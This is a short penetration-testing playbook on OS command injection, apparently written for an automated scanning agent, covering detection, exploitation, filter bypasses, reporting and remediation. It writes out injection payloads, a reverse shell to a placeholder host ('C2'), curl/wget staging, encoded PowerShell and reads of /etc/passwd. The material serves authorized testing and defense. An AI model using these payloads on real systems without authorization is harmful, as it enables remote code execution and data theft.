# Playbook: OS Command Injection

Input reaches an OS shell (`system`, `exec`, backticks, `subprocess(shell=True)`).
Sinks: ping/traceroute/nslookup tools, file converters (ImageMagick/ffmpeg/pdf),
backup/export, "run report", filename handling, network admin panels, webhooks.

## Detection (blind is the usual case)

1. Append shell separators to a working value: `; id`, `| id`, `&& id`, `|| id`,
   `` `id` ``, `$(id)`, newline `%0a id`.
2. **Time-based:** `; sleep 5`, `& ping -n 6 127.0.0.1` (Windows), `|| sleep 5`.
   Require a consistent delay over repeated trials above the measured baseline -
   never flag one slow response.
3. **OOB (strongest):** `; nslookup <callback>` / `; curl http://<callback>/`.
   A DNS/HTTP callback via `oob_start`/`oob_poll` confirms blind RCE.

## Exploitation

Read: `; cat /etc/passwd`, `; id`, `; whoami`. Shell:
`bash -i >& /dev/tcp/C2/4444 0>&1`, or stage via curl/wget/certutil. Windows:
`& whoami`, `& powershell -e <b64>`.

## Bypass

Spaces: `${IFS}`, `cat</etc/passwd`, `{cat,/etc/passwd}`. Keywords: `c''at`, `c\at`.
Separators: try every one of `; | & %0a $() `` `. Stage a script when inline is
filtered.

## Related

Input into a language `eval`/template -> code injection / SSTI (see
`deserialization-ssti.md`), same impact, different payloads.

## Report

PoC = OOB callback or a reliable injected-command time delay vs baseline. Critical
(RCE as the service account). `verified: true` only on a deterministic hit.

## Remediation

No shell: argument-array APIs (`subprocess.run([...], shell=False)`). If
unavoidable, strict value allow-listing, no metacharacters, least privilege.
